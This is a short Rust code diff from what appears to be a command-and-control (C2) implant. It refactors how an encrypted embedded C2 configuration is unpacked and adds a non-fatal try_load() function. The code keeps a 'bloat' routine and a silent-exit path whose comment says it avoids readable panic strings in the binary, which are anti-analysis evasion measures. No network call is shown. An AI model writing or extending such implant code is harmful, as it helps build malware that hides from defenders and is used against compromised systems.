@@ -10,12 +10,14 @@ pub fn load() -> C2Config {
     // 1. Run Bloat
     use_bloat();
 
-    // 2. Decrypt Config using generated get_config()
+    // 2. Unpack - silent exit on failure (no readable panic string in binary)
+    try_load().unwrap_or_else(|| std::process::exit(1))
+}
+
+/// Non-fatal embedded-config read for diagnostics: returns None when no
+/// valid config is embedded (e.g. unit-test binaries), where load() would
+/// terminate the process. Skips the bloat routine - irrelevant for reads.
+pub fn try_load() -> Option<C2Config> {
     let bytes = get_config();
-
-    // 3. Unpack the binary config - silent exit on failure (no readable
-    // panic string in binary)
-    let config = C2Config::unpack(&bytes).unwrap_or_else(|| std::process::exit(1));
-
-    config
+    C2Config::unpack(&bytes)
 }
